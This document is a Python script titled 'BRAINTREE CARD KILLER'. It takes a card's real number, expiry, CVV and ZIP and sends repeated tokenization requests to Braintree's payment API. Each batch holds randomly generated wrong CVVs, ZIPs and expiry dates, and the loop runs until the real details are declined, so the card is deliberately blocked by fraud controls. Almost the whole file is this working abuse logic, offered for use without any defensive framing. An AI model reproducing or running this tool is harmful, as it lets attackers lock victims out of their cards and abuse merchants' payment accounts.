import requests
import time
import random
import threading
from base64 import b64encode

# ====== USER INPUT ======
print("=" * 50)
print("💳 BRAINTREE CARD KILLER (LIVE API FLOW)")
print("=" * 50)

card_number = input("Enter Card Number: ")
exp_month = input("Enter Expiry Month (MM): ")
exp_year = input("Enter Expiry Year (YYYY): ")
cvv_real = input("Enter CVV: ")
zip_real = input("Enter ZIP Code: ")

# ====== BRAINTREE CREDENTIALS ======
BT_MERCHANT_ID = "your_merchant_id"
BT_PUBLIC_KEY = "your_public_key"
BT_PRIVATE_KEY = "your_private_key"

auth_string = f"{BT_PUBLIC_KEY}:{BT_PRIVATE_KEY}"
encoded_auth = b64encode(auth_string.encode()).decode()

headers = {
    "Authorization": f"Basic {encoded_auth}",
    "Content-Type": "application/json"
}

gateway_url = f"https://payments.sandbox.braintree-api.com/graphql"

loading = True
start_time = time.time()

# ====== LOADING BAR ======
def animate_loading():
    bar = ["[⬛⬜⬜⬜⬜]", "[⬛⬛⬜⬜⬜]", "[⬛⬛⬛⬜⬜]", "[⬛⬛⬛⬛⬜]", "[⬛⬛⬛⬛⬛]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

# ====== CHARGE FUNCTION ======
def send_braintree_charge(cvv, zip_code, month, year):
    payload = {
        "query": """
        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
          tokenizeCreditCard(input: $input) {
            paymentMethod {
              id
            }
          }
        }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": month,
                    "expirationYear": year,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": zip_code
                    }
                }
            }
        }
    }

    try:
        response = requests.post(gateway_url, json=payload, headers=headers, timeout=10)
        data = response.json()

        if "errors" in data:
            return "declined"
        elif "paymentMethod" in data.get("data", {}).get("tokenizeCreditCard", {}):
            return "approved"
        else:
            return "error"

    except Exception as e:
        return "timeout"

# ====== MAIN KILLER LOGIC ======
def kill_card():
    global loading
    attempt = 0
    killed = False

    while not killed:
        for _ in range(5):  # Braintree can fail after 4–6
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(2025, 2030))

            attempt += 1
            result = send_braintree_charge(fake_cvv, fake_zip, fake_month, fake_year)
            print(f"\n[Attempt {attempt}] Fake charge: {result}")

        # Real charge
        result = send_braintree_charge(cvv_real, zip_real, exp_month, exp_year)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive... Retrying!\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

# ====== RUNNING THREADS ======
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
